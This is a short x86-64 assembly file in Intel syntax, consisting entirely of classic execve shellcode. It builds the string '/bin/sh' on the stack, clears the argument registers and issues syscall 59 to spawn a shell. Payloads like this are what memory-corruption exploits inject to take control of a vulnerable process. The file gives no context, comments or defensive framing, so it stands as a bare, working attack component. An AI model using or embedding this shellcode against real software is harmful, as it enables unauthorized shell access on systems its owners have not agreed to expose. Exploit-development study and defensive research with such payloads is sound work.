.intel_syntax noprefix

.text
	mov rax, 0x68732f6e69622f
	push rax
	push rsp
	pop rdi
	xor esi, esi
	xor edx, edx
	push 59
	pop rax
	syscall
